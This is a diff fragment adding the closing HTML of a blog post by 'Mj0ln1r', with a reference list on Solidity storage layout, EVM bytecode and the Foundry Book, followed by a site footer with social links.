+<h2 id="references">References</h2>
+
+<ol>
+  <li><a href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html" target="_blank">Solidity Docs</a></li>
+  <li><a href="https://noxx.substack.com/p/evm-deep-dives-the-path-to-shadowy-3ea" target="_blank">noxx.substack.com</a></li>
+  <li><a href="https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018" target="_blank">Storage Layout</a></li>
+  <li><a href="https://blog.trustlook.com/understand-evm-bytecode-part-2/" target="_blank">blog.trustlook.com</a></li>
+  <li><a href="https://book.getfoundry.sh/" target="_blank">Foundry Book</a></li>
+</ol>
+
+<hr />
+
+<p>Thank you for reading!</p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="/">
+    <span>
+        <b>Mj0ln1r</b>
+    </span>
+    
+    <span>© 2023
+  </a>
+
+  <a href="https://twitter.com/TheMj0ln1r" target="_blank">
+  </span>/Twitter</span>
+  </a>
+
+  <a href="https://github.com/TheMj0ln1r" target="_blank">
+  </span>/Github</span>
+  </a>
+
+  <a href="https://www.linkedin.com/in/mj0ln1r" target="_blank">
+  </span>/LinkedIn</span></a>
+
+  <a href=""><span style="color:red;">^TOP</span></a>
+
+</footer>
+
+  
+</body>
+
+</html>
